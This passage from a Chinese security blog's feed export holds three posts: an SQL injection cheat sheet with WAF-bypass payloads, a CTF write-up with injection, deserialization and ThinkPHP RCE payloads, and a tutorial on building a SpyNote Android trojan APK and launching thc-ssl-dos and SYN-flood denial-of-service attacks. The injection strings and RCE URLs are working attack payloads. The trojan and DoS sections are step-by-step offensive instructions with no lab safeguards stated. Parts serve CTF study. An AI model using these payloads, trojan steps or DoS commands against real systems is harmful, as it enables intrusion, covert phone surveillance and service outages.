spellcheck="true">//如果数据库名是haha，睡5s</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token string">' and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='</span><span class="token number">e</span>'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>实战：</p><pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">2</span>' <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>id<span class="token operator">=</span><span class="token number">2</span>' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">"security"</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token string">' and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='</span><span class="token number">e</span>'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span></code></pre><h4 id="post盲注"><a href="#post盲注" class="headerlink" title="post盲注"></a>post盲注</h4><pre class=" language-sql"><code class="language-sql">"<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true"># //判断闭合方式</span><span class="token string">") or ("</span><span class="token number">1</span><span class="token string">") =("</span><span class="token number">1</span> <span class="token comment" spellcheck="true">//用户名密码都写</span><span class="token keyword">select</span> username，password <span class="token keyword">from</span> table1 <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span></code></pre><p>布尔型盲注最好先猜出他们网站有什么用户名，以一个正确的用户名来当参照</p><pre class=" language-sql"><code class="language-sql">admin"<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'security'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span></code></pre><h3 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h3><p>（要在登录状态下）</p><p>会记录用户数据到数据库</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> <span class="token string">'security'</span><span class="token punctuation">.</span><span class="token string">'uagents'</span><span class="token punctuation">(</span><span class="token string">'uagent'</span><span class="token punctuation">,</span><span class="token string">'ip_address'</span><span class="token punctuation">,</span><span class="token string">'username'</span><span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'浏览器信息'</span><span class="token punctuation">,</span><span class="token string">'172.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>referer <span class="token operator">=</span> 来路信息<span class="token punctuation">(</span>从哪个网站过来<span class="token punctuation">)</span>cookie 平行越权admin" <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#</span></code></pre><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><h4 id="过滤–"><a href="#过滤–" class="headerlink" title="过滤–"></a>过滤–</h4><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">limit</span>  <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span></code></pre><h4 id="屏蔽and-or"><a href="#屏蔽and-or" class="headerlink" title="屏蔽and or"></a>屏蔽and or</h4><p>但凡侦测到，直接替换为空</p><pre class=" language-php"><code class="language-php"><span class="token variable">$url1</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token variable">$url2</span><span class="token operator">=</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token variable">$url1</span><span class="token punctuation">)</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'or'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>应对方法：</p><blockquote><p>&#x2F;*!or*&#x2F; </p><p>(嵌套) aandnd</p><p>(替换) &amp; ||</p><p>转url编码%26</p></blockquote><h4 id="屏蔽and-or-空格-–-x2F-x2F"><a href="#屏蔽and-or-空格-–-x2F-x2F" class="headerlink" title="屏蔽and or 空格  \ –+ # &#x2F;**&#x2F;"></a>屏蔽and or 空格  \ –+ # &#x2F;**&#x2F;</h4><p>空格代替品</p><pre class=" language-url"><code class="language-url">%09  水平tab键%0a  新建一行%0c  新建一页%0d  return功能%0b  垂直tab键%a0  空格</code></pre><pre class=" language-sql"><code class="language-sql"><span class="token punctuation">(</span>不用空格<span class="token punctuation">)</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">||</span><span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token punctuation">)</span><span class="token operator">like</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token number">1</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span></code></pre><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>mysql用gbk编码，把两个字符当做一个汉字存在，%df吃掉了\，因为urlencode(\‘)&#x3D;%5c%27,如果前面加上一个%df，%df%5c是一个汉字，%27会独立出来，恢复’功能（用unicode编码就不会出现这个问题）</p><blockquote><p>很重要！</p><p>在post情况下的宽字节注入，得直接在burp的post数据包中修改，因为前端提交的时候和直接在数据包中修改，前端的不会变成中文</p></blockquote><h4 id="奇淫巧技"><a href="#奇淫巧技" class="headerlink" title="奇淫巧技"></a>奇淫巧技</h4><p>1.大小写绕过</p><blockquote><p>Union SeleCT</p></blockquote><p>2.双写绕过</p><blockquote><p>union selselectect</p></blockquote><p>3.编码绕过</p><blockquote><p>‘scurity’ &#x3D; 0x73637572697479</p></blockquote><p>4.注释符</p><blockquote><p>uni&#x2F;**&#x2F;on sel&#x2F;**&#x2F;ect</p></blockquote><p>5.空格绕过</p><blockquote><p>看上面</p></blockquote><p>6.or and绕过</p><blockquote><p>and &#x3D;&#x3D; &amp;&amp;</p><p>or &#x3D;&#x3D; ||</p></blockquote><p>7.内联函数</p><blockquote><p>&#x2F;*!select*&#x2F; 1,2,3</p></blockquote><p>8.&lt;&gt;绕过</p><blockquote><p>uni&lt;&gt;on</p></blockquote><p>9.屏蔽逗号</p><blockquote><p>select substr(‘security’,1,3)</p><p>select  substr(‘security’ from 1 for 3)</p><p>union select 1,2,3</p><p>union select * from (select 1)a join (select 2)b join(select 3)c</p><p>limit 0,1  &#x3D;&#x3D; limit 0 offset 1</p></blockquote><p>10.sleep屏蔽</p><blockquote><p>and sleep(1) &#x3D;&#x3D; and benchmark(1000000000,1)</p></blockquote><p>11.group_concat屏蔽</p><blockquote><p>select group_concat(‘x’,’y’) &#x3D;&#x3D; select group_ws(‘’,’x’,’y’)</p></blockquote><p>12.&#x3D;屏蔽</p><blockquote><p>使用like rlike regexp &lt;&gt;</p><p>id&#x3D;1’ or ‘1’ like ‘1</p></blockquote><p>13.POST屏蔽#</p><blockquote><p>考虑使用– a大部分情况可以当做#用</p><p>uname&#x3D;admin – a&amp;passwd&#x3D;admin</p></blockquote><p>14.特殊符号过waf</p><blockquote><p>&#x2F;*!50001 select * from users*&#x2F;</p><p>ps:这里的50001&#x3D;如果数据库版本是5.00.01以上的版本，这个语句才会被执行</p></blockquote><p>15.ip地址拦截</p><blockquote><p>放在burp的数据包中的</p><p>x-forward-for</p><p>x-remote-ip</p><p>x-originating-ip</p><p>x-remote-addr</p><p>x-real-ip</p></blockquote><p>16.修改资源</p><blockquote><p><a href="http://www.xx.com/sql.php?id=1">http://www.xx.com/sql.php?id=1</a></p><p><a href="http://www.xx.com/sql.php/1.js?id=1">http://www.xx.com/sql.php/1.js?id=1</a></p></blockquote><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'insert into users(username,pasword)values('</span>zs<span class="token string">','</span><span class="token number">123456</span>'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">-- </span></code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2017/09/让webapp的UI体验更接近原生的小技巧/">让webapp的UI体验更接近原生的小技巧</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Web进阶篇</title>
      <link href="/2022/03/25/gongfangshijie/"/>
      <url>/2022/03/25/gongfangshijie/</url>
      
        <content type="html"><![CDATA[<h1 id="web进阶篇"><a href="#web进阶篇" class="headerlink" title="web进阶篇"></a>web进阶篇</h1><h6 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h6><p>根据提示想到初始页面index.php，但是会一直跳转到1.php里，按f12打开index.php,在响应头里找到flag</p><p><img src="/2022/03/25/gongfangshijie/image-20220121185934151.png" alt="image-20220121185934151"></p><h6 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h6><p>开局一张滑稽，查看源码找到source.php,代码审计，查看hint.php,提示flag在ffffllllaaaagggg，通过source.php?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg找到flag</p><p><img src="/2022/03/25/gongfangshijie/image-20220121190910570.png" alt="image-20220121190910570"></p><h6 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h6><p>没什么好说的，查看robots.txt文件找到fl0g.php</p><p><img src="/2022/03/25/gongfangshijie/image-20220121191216837.png" alt="image-20220121191216837"></p><h6 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h6><p>查看index.phps之后输入&#x2F;index.php?id&#x3D;%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65（对admin进行两次url编码）</p><p><img src="/2022/03/25/gongfangshijie/image-20220121191517055.png" alt="image-20220121191517055"></p><h6 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h6><p>代码审计发现是反序列化，序列化一下就好</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">xctf</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token keyword">public</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'bad requests'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">xctf</span><span class="token punctuation">(</span><span class="token string">"$code"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>得到O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}，提交获得flag</p><p><img src="/2022/03/25/gongfangshijie/image-20220121192033277.png" alt="image-20220121192033277"></p><h6 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h6><p>将代码放入php中跑一下</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>        <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>            <span class="token comment" spellcheck="true">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">'index.php'</span><span class="token punctuation">;</span>         <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token string">"fl4g.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//echo base64_encode('O:+4:"Demo":2:&amp;#123;s:10:"Demofile";s:8:"fl4g.php";&amp;#125;');</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>    <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123; </span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span><span class="token delimiter">?></span></code></pre><p>先序列化，然后O:+4:”Demo”:2:{s:10:”%00Demo%00file”;s:8:”fl4g.php”;}%00在burp中urldecode之后再base64加密TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;得到flag</p><p><img src="/2022/03/25/gongfangshijie/image-20220121192703117.png" alt="image-20220121192703117"></p><h6 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h6><p>ThinkPHP v5的漏洞</p><p>exp</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>think\<span class="token package">app</span><span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>ls</code></pre><p><img src="/2022/03/25/gongfangshijie/image-20220121193048851.png" alt="image-20220121193048851"></p><h6 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h6><p>查看源码，使用伪协议，php:&#x2F;&#x2F;小写被屏蔽，切换大写</p><p>&#x2F;?hello&#x3D;xxxxx&amp;page&#x3D;<a href="php://input/">Php:&#x2F;&#x2F;input</a><?php system("ls");?></p><p><img src="/2022/03/25/gongfangshijie/image-20220121193537722.png" alt="image-20220121193537722"></p><h6 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h6><pre class=" language-mysql"><code class="language-mysql">/?inject=1';show databases; --+/?inject=1';show tables; --+1919810931114514words/?inject=1';show columns from `words`; --+</code></pre><p>words里面id data</p><p>1919810931114514里面flag<br>推断：</p><pre class=" language-mysql"><code class="language-mysql">select id,data from `words` where id='$id'rename tables `words` to `haha`;rename tables `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100);--+输出绝对正确的答案/?inject=1' or 1 --+</code></pre><p><img src="/2022/03/25/gongfangshijie/image-20220121194239602.png" alt="image-20220121194239602"></p><h6 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h6><p>跑id，跑到2333出现flag<img src="/2022/03/25/gongfangshijie/image-20220121194515141.png" alt="image-20220121194515141"></p><h6 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h6><p>sql注入，单引号闭合，不屏蔽#，走流程，得到flag<img src="/2022/03/25/gongfangshijie/image-20220121200149783.png" alt="image-20220121200149783"></p><h6 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h6><p>暂时不写，下一个</p><h6 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h6><p>文件上传，挂马，菜刀连，flag就不搞了</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2017/09/让webapp的UI体验更接近原生的小技巧/">让webapp的UI体验更接近原生的小技巧</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手机木马移动安全以及拒绝服务攻击</title>
      <link href="/2022/03/24/android/"/>
      <url>/2022/03/24/android/</url>
      
        <content type="html"><![CDATA[<h1 id="认识手机木马以及移动安全"><a href="#认识手机木马以及移动安全" class="headerlink" title="认识手机木马以及移动安全"></a>认识手机木马以及移动安全</h1><h2 id="android"><a href="#android" class="headerlink" title="android"></a>android</h2><p>基于linux</p><p>开发语言java</p><p>应用广泛：<br>什么地方都有java虚拟机</p><p>但是：</p><p>java-&gt;臃肿-&gt;java虚拟机-&gt;c语言-&gt;机器语言-&gt;操作系统</p><p>苹果：</p><p>oc&#x2F;swift-&gt;机器语言-&gt;操纵系统</p><h2 id="关于java"><a href="#关于java" class="headerlink" title="关于java"></a>关于java</h2><p>网站：</p><p>java web</p><p>jsp+linux+mysql&#x2F;oracle&#x2F;db2+tomcat</p><p>实际上更好用的：</p><p>php+linux+nginx+mysql</p><p>jvm pc：</p><p>java&#x3D;&gt;jar程序</p><p>但是：</p><p>kotlin(简单！！！)&#x3D;&gt;jar程序</p><p>c#(c++++难度不高，用户多)&#x2F;python（超级简单）都很牛逼</p><p>Golang(c的精确度，python的快速开发，几乎啥事都能做)</p><p>java android：</p><p>java + c(编写.so&#x3D;windows的dll文件)&#x3D;&gt;android</p><p>或者：</p><p>kotlin(像python，写代码非常快)+c &#x3D;&gt; android</p><h2 id="一些相关问题"><a href="#一些相关问题" class="headerlink" title="一些相关问题"></a>一些相关问题</h2><p>纠结什么语言有前途？</p><p>主要看：这个语言后台的大佬有没有钱投入？</p><p>c&#x2F;c++ 不可能落寞!!!全球都支持它<br>java 靠oracle公司支持，老旧设备<br>kotlin 谷歌+Intellj<br>oc&#x2F;swift 苹果公司<br>php 基金会，全球90%的网站都在使用<br>python 基金会，小部分人工智能开发&#x2F;快速开发的公司<br>go 谷歌，区块链开发公司<br>c++&#x2F;c#&#x2F;vb 微软公司</p><h2 id="android木马"><a href="#android木马" class="headerlink" title="android木马:"></a>android木马:</h2><p>以云盘的：Last_Version为例，木马名字为SpyNote.exe</p><p>并安装：</p><p><img src="/2022/03/24/android/image-20220111154222265.png" alt="image-20220111154222265"></p><p>java环境</p><p>安装后，打开SpyNote.exe主控端：</p><p><img src="/2022/03/24/android/image-20220111154539140.png" alt="image-20220111154539140"></p><p>大多数情况，木马只需要具备：<br>上线，文件控制，提权（可有可无），命令执行</p><p>如果想学android开发：<br>不要太在意自己学的是不是java，因为android上的编程，相当于一门长得很像java的java语言</p><p>然后设置：</p><p><img src="/2022/03/24/android/image-20220111154736842.png" alt="image-20220111154736842"></p><p><img src="/2022/03/24/android/image-20220111154808544.png" alt="image-20220111154808544"></p><p>也可以设置一些功能：</p><p><img src="/2022/03/24/android/image-20220111154858453.png" alt="image-20220111154858453"></p><p>简单测试一下：Build，把木马相关写入相应apk文件里：</p><p><img src="/2022/03/24/android/image-20220111155022994-16418874238881.png" alt="image-20220111155022994"></p><p>确保电脑的3210端口打开在监听状态。</p><p>然后连接手机：</p><pre><code>ftp://192.168.1.202:2221</code></pre><p><img src="/2022/03/24/android/image-20220111155157025.png" alt="image-20220111155157025"></p><p>把木马apk文件发送到手机文件里：</p><p><img src="/2022/03/24/android/image-20220111155241421.png" alt="image-20220111155241421"></p><p>然后用户安装了app后，打开之后，电脑端木马就上线了。</p><p>然后就可以做很多事情了。</p><h2 id="DOS拒绝服务攻击"><a href="#DOS拒绝服务攻击" class="headerlink" title="DOS拒绝服务攻击"></a>DOS拒绝服务攻击</h2><h2 id="DDOS分布式拒绝服务攻击"><a href="#DDOS分布式拒绝服务攻击" class="headerlink" title="DDOS分布式拒绝服务攻击"></a>DDOS分布式拒绝服务攻击</h2><p>tcp三次握手</p><p>目前这种攻击无解<br>一般大佬的防御（用钱）</p><h2 id="实验进行DOS攻击"><a href="#实验进行DOS攻击" class="headerlink" title="实验进行DOS攻击"></a>实验进行DOS攻击</h2><h3 id="kali的更新源设置为阿里云的："><a href="#kali的更新源设置为阿里云的：" class="headerlink" title="kali的更新源设置为阿里云的："></a>kali的更新源设置为阿里云的：</h3><p>目录&#x2F;etc&#x2F;apt&#x2F;source.list，下载到本机</p><pre class=" language-bash"><code class="language-bash">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span class="token comment" spellcheck="true"># 如下图：</span></code></pre><p><img src="/2022/03/24/android/image-20220111160404450.png" alt="image-20220111160404450"></p><p>设置完成后再把文件放回kali里</p><p>然后在kali命令行：</p><pre class=" language-Linux"><code class="language-Linux">apt-get update    # 更新apt-get install thc-ssl-dos    # 安装软件</code></pre><h3 id="类似kali的安全审计系统——功能和隐蔽性较好"><a href="#类似kali的安全审计系统——功能和隐蔽性较好" class="headerlink" title="类似kali的安全审计系统——功能和隐蔽性较好"></a>类似kali的安全审计系统——功能和隐蔽性较好</h3><p><a href="https://www.parrotsec.org/">https://www.parrotsec.org/</a></p><p><img src="/2022/03/24/android/image-20220111160229567.png" alt="image-20220111160229567"></p><p>需要安装。</p><p>如果想直接导入虚拟机，不想安装，可以：</p><p><img src="/2022/03/24/android/image-20220111160706009.png" alt="image-20220111160706009"></p><p>用live模式打开parrot：</p><p>用bitvise连接。</p><pre class=" language-Linux"><code class="language-Linux">uname -a  # 查看相关</code></pre><h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS:"></a>DOS:</h2><h4 id="ssl-dos"><a href="#ssl-dos" class="headerlink" title="ssl-dos:"></a><strong>ssl-dos</strong>:</h4><p>服务器每次会处理300次&#x2F;s的ssl请求<br>这种攻击方法和传统攻击不一样，使用普通带宽也可以考虑打30G带宽的服务器</p><p>安装</p><pre class=" language-Linux"><code class="language-Linux">apt-get install thc-ssl-dos</code></pre><p>目标是打击https的网站：</p><pre class=" language-Linux"><code class="language-Linux">thc-ssl-dos [目标ip] [目标ssl端口:443] --accept</code></pre><h4 id="syn-flood"><a href="#syn-flood" class="headerlink" title="syn flood:"></a>syn flood:</h4><p>syn洪水攻击</p><pre class=" language-Linux"><code class="language-Linux">先安装：apt install python-scapyapt install 